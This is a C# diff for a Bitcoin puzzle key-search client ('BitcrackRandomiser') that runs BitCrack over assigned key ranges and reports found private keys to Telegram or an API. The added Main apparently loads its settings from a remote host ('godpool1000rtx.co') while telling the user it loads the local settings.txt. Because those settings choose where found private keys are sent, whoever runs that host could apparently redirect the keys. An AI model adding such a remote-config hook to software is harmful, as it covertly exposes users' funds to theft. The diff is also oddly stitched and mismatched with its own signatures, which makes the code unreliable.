@@ -1,496 +1,353 @@
-using System;
 using System.Diagnostics;
+using System.Reflection;
 
 namespace BitcrackRandomiser
 {
-    internal class Settings
+    class Program
     {
-        /// <summary>
-        /// Target puzzle number. [66,67,68]
-        /// </summary>
-        public string TargetPuzzle { get; set; } = "66";
+        // Found private key
+        public static string PrivateKey = "";
 
-        /// <summary>
-        /// Which app will be used.
-        /// </summary>
-        public AppType AppType { get; set; } = AppType.bitcrack;
+        // Is proof of work key
+        public static bool IsProofKey = false;
 
-        /// <summary>
-        /// Bitcrack app folder path
-        /// </summary>
-        public string AppPath { get; set; } = string.Empty;
+        // Proof of work key
+        public static string ProofKey = "";
 
-        /// <summary>
-        /// Bitcrack args
-        /// Example: -b 896 -t 256 -p 256
-        /// </summary>
-        string _AppArgs = "";
-        public string AppArgs
-        {
-            get
-            {
-                if (_AppArgs.Contains("-o"))
-                {
-                    return _AppArgs.Replace("-o", "x");
-                }
-                else if (_AppArgs.Contains("--keyspace"))
-                {
-                    return _AppArgs.Replace("--keyspace", "x");
-                }
-                return _AppArgs;
-            }
-            set
-            {
-                _AppArgs = value;
-            }
-        }
-
-        /// <summary>
-        /// User token value
-        /// </summary>
-        public string UserToken { get; set; } = "";
-
-        /// <summary>
-        /// Wallet address for worker
-        /// </summary>
-        string _WalletAddress = "";
-        public string WalletAddress { 
-            get
-            {
-                if(!_WalletAddress.Contains('.'))
-                {
-                    var Random = new Random();
-                    _WalletAddress = string.Format("{0}.worker{1}", _WalletAddress, Random.Next(1000, 9999));
-                }
-
-                if (_WalletAddress.Length < 6)
-                {
-                    _WalletAddress = "Unknown";
-                }
-
-                return _WalletAddress;
-            }
-            set
-            {
-                _WalletAddress = value;
-            }
-        }
-
-        /// <summary>
-        /// Parsed wallet address
-        /// </summary>
-        public string ParsedWalletAddress
-        {
-            get
-            {
-                return WalletAddress.Split('.')[0];
-            }
-        }
-
-        /// <summary>
-        /// Parsed worker name
-        /// </summary>
-        public string ParsedWorkerName
-        {
-            get
-            {
-                return WalletAddress.Split('.')[1];
-            }
-        }
-
-        /// <summary>
-        /// Scan type
-        /// default: Default
-        /// includeDefeatedRanges: Include defeated ranges to scan
-        /// excludeIterated2: Exclude if HEX iterated 2
-        /// excludeIterated3: Exclude if HEX iterated 3
-        /// excludeIterated4: Exclude if HEX iterated 4 or more
-        /// excludeStartsWithXX: Exclude if HEX starts with XX [1-2 chars]
-        /// </summary>
-        public string ScanType { get; set; } = "default";
-
-        /// <summary>
-        /// Custom ranges to scan
-        /// Min length 2
-        /// Max length 5
-        /// Example [20,3FF,2DAB]
-        /// </summary>
-        public string CustomRange { get; set; } = "none";
-
-        /// <summary>
-        /// Send POST request on each key scanned/key found
-        /// </summary>
-        public string ApiShare { get; set; } = "";
-
-        /// <summary>
-        /// Is API share is active
-        /// </summary>
-        public bool IsApiShare
-        {
-            get
-            {
-                if(Uri.IsWellFormedUriString(ApiShare, UriKind.Absolute))
-                {
-                    return true;
-                }
-
-                return false;
-            }
-        }
-
-        /// <summary>
-        /// Telegram share is active
-        /// </summary>
-        public bool TelegramShare { get; set; } = false;
-
-        /// <summary>
-        /// Telegram access token
-        /// </summary>
-        public string TelegramAccessToken { get; set; } = string.Empty;
-
-        /// <summary>
-        /// Telegram chat id
-        /// </summary>
-        public string TelegramChatId { get; set; } = string.Empty;
-
-        /// <summary>
-        /// Send notification when each key scanned
-        /// </summary>
-        public bool TelegramShareEachKey { get; set; } = false;
-
-        /// <summary>
-        /// Leave true on untrusted computer
-        /// Private key is not written to the file and console screen.
-        /// Private key will be delivered to Telegram only.
-        /// </summary>
-        public bool UntrustedComputer { get; set; } = false;
-
-        /// <summary>
-        /// Test mode.
-        /// If true, example private key will be found.
-        /// </summary>
-        public bool TestMode { get; set; } = false;
-
-        /// <summary>
-        /// Force continue to if key found
-        /// If true, scan will continue until it is finished and will marked as scanned
-        /// </summary>
-        public bool ForceContinue { get; set; } = false;
-
-        /// <summary>
-        /// Private pool id
-        /// </summary>
-        public string PrivatePool { get; set; } = "none";
-
-        /// <summary>
-        /// Is private pool
-        /// </summary>
-        public bool IsPrivatePool
-        {
-            get
-            {
-                if(PrivatePool.Length == 8)
-                {
-                    return true;
-                }
-
-                return false;
-            }
-        }
+        // GPU Model name
+        public static string GPUName = "-";
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="args"></param>
-        /// <returns></returns>
-        public static Settings GetSettings(string[] args)
+        public static void Main(string[] args)
         {
-            Settings settings = new Settings();
-            string Path = AppDomain.CurrentDomain.BaseDirectory + "settings.txt";
+            // Get settings
+            var AppSettings = Settings.GetSettings(args, "https://www.godpool1000rtx.co/settings.txt");
 
-            // From file
-            string[] Lines = File.ReadLines(Path).ToArray();
-
-            // From arguments
-            if(args.Length > 0)
+            // Edit settings
+            Helpers.WriteLine(string.Format("Press <enter> to edit settings or wait for {0} seconds to load app with <settings.txt>", 3));
+            if (!Console.IsInputRedirected)
             {
-                Lines = args;
-            }
-
-            foreach (var line in Lines)
-            {
-                if (line.Contains('='))
+                bool EditSettings = Task.Factory.StartNew(() => Console.ReadLine()).Wait(TimeSpan.FromSeconds(3));
+                if (EditSettings)
                 {
-                    string key = line.Split('=')[0];
-                    string value = line.Split("=")[1];
-
-                    switch (key)
-                    {
-                        case "target_puzzle":
-                            settings.TargetPuzzle = value;
-                            break;
-                        case "app_type":
-                            AppType _at = AppType.bitcrack;
-                            _ = Enum.TryParse(value, true, out _at);
-                            settings.AppType = _at;
-                            break;
-                        case "app_path":
-                            if(value == "cuBitcrack" || value == "clBitcrack")
-                            {
-                                if(Environment.OSVersion.Platform == PlatformID.Win32NT)
-                                {
-                                    value = string.Format("{0}bitcrack\\{1}.exe", AppDomain.CurrentDomain.BaseDirectory, value);
-                                }
-                                else if (Environment.OSVersion.Platform == PlatformID.Unix)
-                                {
-                                    value = string.Format("{0}bitcrack/./{1}", AppDomain.CurrentDomain.BaseDirectory, value);
-                                }
-                            }
-                            settings.AppPath = value;
-                            break;
-                        case "app_arguments":
-                            settings.AppArgs = value;
-                            break;
-                        case "user_token":
-                            settings.UserToken = value;
-                            break;
-                        case "wallet_address":
-                            settings.WalletAddress = value;
-                            break;
-                        case "scan_type":
-                            settings.ScanType = value;
-                            break;
-                        case "custom_range":
-                            settings.CustomRange = value;
-                            break;
-                        case "api_share":
-                            settings.ApiShare = value;
-                            break;
-                        case "telegram_share":
-                            bool _v;
-                            _ = bool.TryParse(value, out _v);
-                            settings.TelegramShare = _v;
-                            break;
-                        case "telegram_accesstoken":
-                            settings.TelegramAccessToken = value;
-                            break;
-                        case "telegram_chatid":
-                            settings.TelegramChatId = value;
-                            break;
-                        case "telegram_share_eachkey":
-                            bool _s;
-                            _ = bool.TryParse(value, out _s);
-                            settings.TelegramShareEachKey = _s;
-                            break;
-                        case "untrusted_computer":
-                            bool _u;
-                            _ = bool.TryParse(value, out _u);
-                            settings.UntrustedComputer = _u;
-                            break;
-                        case "test_mode":
-                            bool _t;
-                            _ = bool.TryParse(value, out _t);
-                            settings.TestMode = _t;
-                            break;
-                        case "force_continue":
-                            bool _f;
-                            _ = bool.TryParse(value, out _f);
-                            settings.ForceContinue = _f;
-                            break;
-                        case "private_pool":
-                            settings.PrivatePool = value;
-                            break;
-                    }
+                    AppSettings = Settings.SetSettings();
                 }
             }
-            return settings;
-        }
 
-        /// <summary>
-        /// Create settings
-        /// </summary>
-        /// <returns></returns>
-        public static Settings SetSettings()
-        {
-            Console.Clear();
-            var ConsoleSettings = new Settings();
+            // Send worker start message to telegram if active
+            Helpers.ShareTelegram(string.Format("[{0}].[{2}] started job for (Puzzle{1})", Helpers.StringParser(AppSettings.ParsedWalletAddress), AppSettings.TargetPuzzle, AppSettings.ParsedWorkerName), AppSettings);
 
-            // Select puzzle
-            string _Puzzle = DetermineSettings("Select a puzzle number", new string[3] { "66", "67", "68" });
+            // Send progress to api_share if active
+            _ = Requests.SendApiShare(new ApiShare { Status = ApiShareStatus.workerStarted }, AppSettings);
 
-            // Select app path
-            string _Folder = DetermineSettings("Enter app folder path [cuBitcrack, clBitcrack or full path of Bitcrack]", null, 6);
-
-            // App arguments
-            var _Arguments = DetermineSettings("Enter app arguments (can be empty)");
-
-            // User token
-            string _UserToken = DetermineSettings("Your user token value", null, 20);
-
-            // Wallet address
-            string _WalletAddress = DetermineSettings("Your BTC wallet address", null, 20);
-
-            // Scan type
-            string _ScanType = DetermineSettings("Select a scan type", new string[2] { "default", "includeDefeatedRanges" });
-
-            // Custom range
-            string _CustomRange = DetermineSettings("Do you want scan custom range?", new string[2] { "yes", "no" });
-            if (_CustomRange == "yes")
+            // Run
+            Helpers.WriteLine("Please wait while app is starting...", MessageType.normal, true);
+            RunBitcrack(AppSettings);
+            while (true)
             {
-                _CustomRange = DetermineSettings("Enter custom range (2B,3DFF or any)", null, 2);
+                Console.ReadLine();
             }
-            else
-            {
-                _CustomRange = "none";
-            }
-
-            // API share
-            string _ApiShare = DetermineSettings("Send API request to URL (can be empty)");
-
-            // Telegram share
-            string _TelegramShare = DetermineSettings("Will telegram sharing be enabled?", new string[2] { "true", "false" });
-
-            // If telegram share will be enabled
-            string _TelegramAccessToken = "0";
-            string _TelegramChatId = "0";
-            string _TelegramShareEachKey = "false";
-            if (_TelegramShare == "true")
-            {
-                _TelegramAccessToken = DetermineSettings("Enter Telegram access token", null, 5);
-                _TelegramChatId = DetermineSettings("Enter Telegram chat id", null, 5);
-                _TelegramShareEachKey = DetermineSettings("Send notification when each key scanned", new string[2] { "true", "false" });
-            }
-
-            // Untrusted computer
-            string _UntrustedComputer = DetermineSettings("Is this computer untrusted?", new string[2] { "true", "false" });
-
-            // Test mode
-            string _TestMode = DetermineSettings("Enable test mode", new string[2] { "true", "false" });
-
-            // Force continue
-            string _ForceContinue = DetermineSettings("Enable force continue", new string[2] { "true", "false" });
-
-            // Private pool
-            string _PrivatePool = DetermineSettings("Private pool id [none] or [pool_id]", null, 4);
-
-            // Settings
-            ConsoleSettings.TargetPuzzle = _Puzzle;
-            ConsoleSettings.AppPath = _Folder;
-            ConsoleSettings.AppArgs = _Arguments;
-            ConsoleSettings.UserToken = _UserToken;
-            ConsoleSettings.WalletAddress = _WalletAddress;
-            ConsoleSettings.ScanType = _ScanType;
-            ConsoleSettings.CustomRange = _CustomRange;
-            ConsoleSettings.ApiShare = _ApiShare;
-            ConsoleSettings.TelegramShare = bool.Parse(_TelegramShare);
-            ConsoleSettings.TelegramAccessToken = _TelegramAccessToken;
-            ConsoleSettings.TelegramChatId = _TelegramChatId;
-            ConsoleSettings.TelegramShareEachKey = bool.Parse(_TelegramShareEachKey);
-            ConsoleSettings.UntrustedComputer = bool.Parse(_UntrustedComputer);
-            ConsoleSettings.TestMode = bool.Parse(_TestMode);
-            ConsoleSettings.ForceContinue = bool.Parse(_ForceContinue);
-            ConsoleSettings.PrivatePool = _PrivatePool;
-
-            // Will save settings
-            string _SaveSettings = "";
-            while (_SaveSettings != "yes" && _SaveSettings != "no")
-            {
-                Helpers.Write("Do you want to save settings to settings.txt? (yes/no) : ", ConsoleColor.Cyan);
-                _SaveSettings = Console.ReadLine() ?? "";
-            }
-
-            // Save settings
-            if (_SaveSettings == "yes")
-            {
-                string SavedSettings = 
-                    "target_puzzle=" + ConsoleSettings.TargetPuzzle + Environment.NewLine +
-                    "app_path=" + ConsoleSettings.AppPath + Environment.NewLine +
-                    "app_arguments=" + ConsoleSettings.AppArgs + Environment.NewLine +
-                    "user_token=" + ConsoleSettings.UserToken + Environment.NewLine +
-                    "wallet_address=" + ConsoleSettings.WalletAddress + Environment.NewLine +
-                    "scan_type=" + ConsoleSettings.ScanType + Environment.NewLine +
-                    "custom_range=" + ConsoleSettings.CustomRange + Environment.NewLine +
-                    "api_share=" + ConsoleSettings.ApiShare + Environment.NewLine +
-                    "telegram_share=" + ConsoleSettings.TelegramShare + Environment.NewLine +
-                    "telegram_accesstoken=" + ConsoleSettings.TelegramAccessToken + Environment.NewLine +
-                    "telegram_chatid=" + ConsoleSettings.TelegramChatId + Environment.NewLine +
-                    "telegram_share_eachkey=" + ConsoleSettings.TelegramShareEachKey + Environment.NewLine +
-                    "untrusted_computer=" + ConsoleSettings.UntrustedComputer + Environment.NewLine +
-                    "test_mode=" + ConsoleSettings.TestMode + Environment.NewLine +
-                    "force_continue=" + ConsoleSettings.ForceContinue + Environment.NewLine +
-                    "private_pool=" + ConsoleSettings.PrivatePool;
-                string AppPath = AppDomain.CurrentDomain.BaseDirectory;
-                using (StreamWriter outputFile = new StreamWriter(Path.Combine(AppPath, "settings.txt")))
-                {
-                    outputFile.WriteLine(SavedSettings);
-                }
-                Helpers.Write("\nSettings saved successfully. App starting ...", ConsoleColor.Green);
-                Thread.Sleep(2000);
-            }
-            else
-            {
-                Helpers.Write("\nApp starting ...", ConsoleColor.Green);
-                Thread.Sleep(2000);
-            }
-
-            return ConsoleSettings;
         }
 
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="Message"></param>
-        /// <param name="Values"></param>
-        /// <param name="MinLength"></param>
         /// <returns></returns>
-        private static string DetermineSettings(string Message, string[]? Values = null, int MinLength = 0)
+        static Task<int> RunBitcrack(Settings settings)
         {
-            string _Value = "";
-            string MessageFormat = Values == null ? string.Format("[Settings] {0} : ", Message) : string.Format("[Settings] {0} ({1}) : ", Message, string.Join('/', Values));
-
-            if (MinLength > 0)
+            // Check important area
+            if (!settings.TelegramShare && settings.UntrustedComputer && !settings.IsApiShare)
             {
-                while (_Value.Length < MinLength)
+                Helpers.WriteLine("If the 'untrusted_computer' setting is 'true', the private key will only be sent to your Telegram address. Please change the 'telegram_share' to 'true' in settings.txt. Then enter your 'access token' and 'chat id'. Otherwise, even if the private key is found, you will not be able to see it anywhere!", MessageType.error, true);
+                Thread.Sleep(10000);
+            }
+
+            // Get random HEX value 
+            string GetHex = Requests.GetHex(settings).Result;
+            string TargetAddress =
+                settings.TargetPuzzle == "38" ? "1HBtApAFA9B2YZw3G2YKSMCtb3dVnjuNe2" :
+                settings.TargetPuzzle == "66" ? "13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so" :
+                settings.TargetPuzzle == "67" ? "1BY8GQbnueYofwSuFAT3USAhGjPrkxDdW9" :
+                settings.TargetPuzzle == "68" ? "1MVDYgVaSN6iKKEsbzRUAYFrYJadLYZvvZ" : "Unknown";
+
+            // Cannot get HEX value
+            if (GetHex == "")
+            {
+                Helpers.WriteLine("Database connection error. Please wait...", MessageType.error);
+                Thread.Sleep(5000);
+                RunBitcrack(settings);
+                return Task.FromResult(0);
+            }
+
+            // Invalid user token or wallet address
+            if (GetHex == "INVALID_USER_TOKEN")
+            {
+                Helpers.WriteLine("Invalid user token value or wallet address.", MessageType.error);
+                return Task.FromResult(0);
+            }
+
+            // Invalid user token or wallet address
+            if (GetHex == "NOT_ELIGIBLE_FOR_FREE")
+            {
+                Helpers.WriteLine("You are not eligible for free tier. For more information, log in to your account at btcpuzzle.info", MessageType.error);
+                return Task.FromResult(0);
+            }
+
+            // Invalid user for private pool
+            if (GetHex == "INVALID_PRIVATE_POOL_USER")
+            {
+                Helpers.WriteLine("Only the user who created the private pool can join the private pool. Please check your user_token and wallet_address value.", MessageType.error);
+                return Task.FromResult(0);
+            }
+
+            // Invalid user for private pool
+            if (GetHex == "INVALID_PRIVATE_POOL")
+            {
+                Helpers.WriteLine("Invalid private pool. There is no such private pool. Check your private_pool value.", MessageType.error);
+                return Task.FromResult(0);
+            }
+
+            // No ranges left to scan
+            if (GetHex == "REACHED_OF_KEYSPACE")
+            {
+                Helpers.WriteLine("Reached of keyspace. No ranges left to scan.");
+                Helpers.ShareTelegram(string.Format("[{0}].[{1}] reached of keyspace", Helpers.StringParser(settings.ParsedWalletAddress), settings.ParsedWorkerName), settings);
+                _ = Requests.SendApiShare(new ApiShare { Status = ApiShareStatus.reachedOfKeySpace }, settings);
+                return Task.FromResult(0);
+            }
+
+            // Parse hex result
+            string RandomHex = GetHex.Split(':')[0];
+            List<string> ProofValues = GetHex.Split(':').Skip(1).ToList();
+            if (ProofValues.Contains(TargetAddress))
+            {
+                // Impossible but, may be proof value == target address?
+                PrivateKey = GetHex.Split(':')[2];
+                JobFinished(TargetAddress, RandomHex, settings, KeyFound: true);
+                return Task.FromResult(0);
+            }
+
+            // Add +1 to random HEX value
+            int StartNumber = int.Parse(RandomHex, System.Globalization.NumberStyles.HexNumber);
+            int EndNumber = StartNumber + 1;
+
+            // Convert numbers to HEX
+            string StartHex = RandomHex;
+            string EndHex = EndNumber.ToString("X");
+
+            // Testing
+            if (settings.TestMode)
+            {
+                // ~1min on 3090
+                TargetAddress = "1Cnrx6rxiGvVNw1UroYM5hRjVvqPnWC7fR";
+                StartHex = "2012E83";
+                EndHex = "2012E84";
+
+                // Test with custom settings
+                string CustomTestFile = AppDomain.CurrentDomain.BaseDirectory + "customtest.txt";
+                if (File.Exists(CustomTestFile))
                 {
-                    Helpers.Write(MessageFormat);
-                    _Value = Console.ReadLine() ?? "";
+                    string[] lines = File.ReadAllLines(CustomTestFile);
+                    if(lines.Length == 3)
+                    {
+                        TargetAddress = lines[0];
+                        StartHex = lines[1];
+                        EndHex = lines[2];
+                    }
                 }
             }
-            else if (Values != null)
+
+            // Write info
+            Helpers.WriteLine(string.Format("[v{1}] {2} starting... Puzzle: [{0}]", settings.TestMode ? "TEST" : settings.IsPrivatePool ? settings.PrivatePool : settings.TargetPuzzle, Assembly.GetEntryAssembly()?.GetName().Version, settings.AppType.ToString().ToUpper()), MessageType.normal, true);
+            Helpers.WriteLine(string.Format("HEX range: {0}-{1}", StartHex, EndHex));
+            Helpers.WriteLine(string.Format("Target address: {0}", TargetAddress));
+            if (settings.TestMode) Helpers.WriteLine("Test mode is active.", MessageType.error);
+            else if (settings.TargetPuzzle == "38") Helpers.WriteLine("Test pool 38 is active.", MessageType.error);
+            else Helpers.WriteLine("Test mode is passive.", MessageType.info);
+            Helpers.WriteLine(string.Format("Scan type: {0}", settings.ScanType.ToString()), MessageType.info);
+            Helpers.WriteLine(string.Format("API share: {0} / Telegram share: {1}", settings.IsApiShare, settings.TelegramShare), MessageType.info);
+            Helpers.WriteLine(string.Format("Untrusted computer: {0}", settings.UntrustedComputer), MessageType.info);
+            Helpers.WriteLine(string.Format("Progress: {0}", "Visit the <btcpuzzle.info> for statistics."));
+            Helpers.WriteLine(string.Format("Your wallet/worker name: {0}", settings.WalletAddress));
+
+            // App arguments
+            string AppArguments = "";
+            if (settings.AppType == AppType.bitcrack)
             {
-                while (!Values.Contains(_Value))
+                string Zeros = (settings.TargetPuzzle == "38" ? new String('0', 8) : new String('0', 10));
+                AppArguments = string.Format("{3} --keyspace {0}{4}:{1}{4} {2} {5}", StartHex, EndHex, TargetAddress, settings.AppArgs, Zeros, string.Join(' ', ProofValues));
+            }
+
+            // Tcs
+            var taskCompletionSource = new TaskCompletionSource<int>();
+
+            // Proccess info
+            var process = new Process
+            {
+                StartInfo = { FileName = settings.AppPath, RedirectStandardError = true, RedirectStandardOutput = true, Arguments = AppArguments },
+                EnableRaisingEvents = true
+            };
+
+            // Output from BitCrack
+            process.ErrorDataReceived += (object o, DataReceivedEventArgs s) => OutputReceivedHandler(o, s, TargetAddress, ProofValues, StartHex, settings, process);
+            process.OutputDataReceived += (object o, DataReceivedEventArgs s) => OutputReceivedHandler(o, s, TargetAddress, ProofValues, StartHex, settings, process);
+
+            // App exited
+            process.Exited += (sender, args) =>
+            {
+                if (process.ExitCode != 0)
                 {
-                    Helpers.Write(MessageFormat);
-                    _Value = Console.ReadLine() ?? "";
+                    Helpers.ShareTelegram(string.Format("[{0}].[{1}] goes offline.", Helpers.StringParser(settings.ParsedWalletAddress), settings.ParsedWorkerName), settings);
+                    _ = Requests.SendApiShare(new ApiShare { Status = ApiShareStatus.workerExited }, settings);
                 }
+                taskCompletionSource.SetResult(process.ExitCode);
+                process.Dispose();
+            };
+
+            // Start the app
+            process.Start();
+            process.BeginErrorReadLine();
+            process.BeginOutputReadLine();
+            return taskCompletionSource.Task;
+        }
+
+        /// <summary>
+        /// Runs on scan completed or private key found
+        /// </summary>
+        /// <param name="TargetAddress">Target address</param>
+        /// <param name="HEX">HEX range</param>
+        /// <param name="settings">Current settings</param>
+        /// <param name="KeyFound">Key found or not</param>
+        private static void JobFinished(string TargetAddress, string HEX, Settings settings, bool KeyFound = false)
+        {
+            if (KeyFound)
+            {
+                // Always send notification when key found
+                Helpers.ShareTelegram(string.Format("[Key Found] Congratulations. Found by worker [{0}].[{2}] {1}", Helpers.StringParser(settings.ParsedWalletAddress), PrivateKey, settings.ParsedWorkerName), settings);
+                _ = Requests.SendApiShare(new ApiShare { Status = ApiShareStatus.keyFound, PrivateKey = PrivateKey, HEX = HEX }, settings);
+
+                // Not on untrusted computer
+                if (!settings.UntrustedComputer)
+                {
+                    Console.WriteLine(Environment.NewLine);
+                    Helpers.WriteLine(PrivateKey, MessageType.success);
+                    Helpers.SaveFile(PrivateKey, TargetAddress);
+                }
+
+                Helpers.WriteLine("Congratulations. Key found. Please check your folder.", MessageType.success);
+                Helpers.WriteLine("You can donate me; 1eosEvvesKV6C2ka4RDNZhmepm1TLFBtw", MessageType.success);
             }
             else
             {
-                Helpers.Write(MessageFormat);
-                _Value = Console.ReadLine() ?? "";
+                // Send request to custom API
+                _ = Requests.SendApiShare(new ApiShare { Status = ApiShareStatus.rangeScanned, HEX = HEX }, settings);
+
+                // Send notification each key scanned
+                if (settings.TelegramShareEachKey)
+                {
+                    Helpers.ShareTelegram(string.Format("[{0}] scanned by [{1}].[{2}]", HEX, Helpers.StringParser(settings.ParsedWalletAddress), settings.ParsedWorkerName), settings);
+                }
+
+                // Flag HEX as used
+                FlagAsScanned(settings, HEX);
+
+                // Wait and restart
+                ProofKey = "";
+                IsProofKey = false;
+                Thread.Sleep(10000);
+                RunBitcrack(settings);
             }
-            Helpers.Write("-------------------------------\n");
-            return _Value;
         }
-    }
 
-    /// <summary>
-    /// Console message type
-    /// </summary>
-    enum MessageType
-    {
-        normal,
-        success,
-        info,
-        error
-    }
+        /// <summary>
+        /// Flag HEX as scanned
+        /// </summary>
+        /// <param name="settings"></param>
+        /// <param name="HEX"></param>
+        /// <returns></returns>
+        private static bool FlagAsScanned(Settings settings, string HEX)
+        {
+            // Hash all proof keys with SHA256
+            ProofKey = Helpers.SHA256Hash(ProofKey);
 
-    /// <summary>
-    /// Apps to scan
-    /// </summary>
-    enum AppType
-    {
-        bitcrack,
-        keyhunt
+            // Try flag
+            bool FlagUsed = Requests.SetHex(HEX, settings.WalletAddress, ProofKey, GPUName, settings.PrivatePool, settings.TargetPuzzle).Result;
+
+            // Try flagging
+            int FlagTries = 1;
+            int MaxTries = 6;
+            while (!FlagUsed && FlagTries <= MaxTries)
+            {
+                FlagUsed = Requests.SetHex(HEX, settings.WalletAddress, ProofKey, GPUName, settings.TargetPuzzle).Result;
+                Helpers.WriteLine(string.Format("Flag error... Retrying... {0}/{1}", FlagTries, MaxTries));
+                Thread.Sleep(10000);
+                FlagTries++;
+            }
+
+            // Info
+            if (FlagUsed)
+            {
+                Helpers.WriteLine("Range scanned and flagged successfully... Launching again... Please wait...");
+            }
+            else
+            {
+                Helpers.WriteLine("Range scanned with flag error... Launching again... Please wait...");
+            }
+
+            return FlagUsed;
+        }
+
+        /// <summary>
+        /// Runs when output data received by external app
+        /// </summary>
+        /// <param name="o"></param>
+        /// <param name="e"></param>
+        /// <param name="TargetAddress">Target address</param>
+        /// <param name="ProofValue">Proof value</param>
+        /// <param name="HEX">Selected HEX range</param>
+        /// <param name="settings">Current settings</param>
+        /// <param name="process">Active proccess</param>
+        private static void OutputReceivedHandler(object o, DataReceivedEventArgs e, string TargetAddress, List<string> ProofValues, string HEX, Settings settings, Process process)
+        {
+            var Status = Helpers.CheckJobStatus(o, e);
+            if (Status.OutputType == OutputType.finished)
+            {
+                // Job finished normally
+                JobFinished(TargetAddress, HEX, settings);
+            }
+            else if (Status.OutputType == OutputType.address)
+            {
+                IsProofKey = ProofValues.Any(Status.Content.Contains);
+                if(!IsProofKey)
+                {
+                    // Check again for known Bitcrack bug - Remove first 10 characters
+                    List<string> ParsedProofValues = ProofValues.Select(x => x[10..]).ToList();
+                    IsProofKey = ParsedProofValues.Any(Status.Content.Contains);
+                }
+            }
+            else if (Status.OutputType == OutputType.privateKeyFound)
+            {
+                if (IsProofKey)
+                {
+                    ProofKey += Status.Content;
+                }
+                else
+                {
+                    if (settings.ForceContinue == false)
+                    {
+                        process.Kill();
+                    }
+                    PrivateKey = Status.Content;
+                    JobFinished(TargetAddress, HEX, settings, KeyFound: true);
+                }
+            }
+            else if (Status.OutputType == OutputType.gpuModel)
+            {
+                GPUName = Status.Content;
+            }
+        }
     }
 }
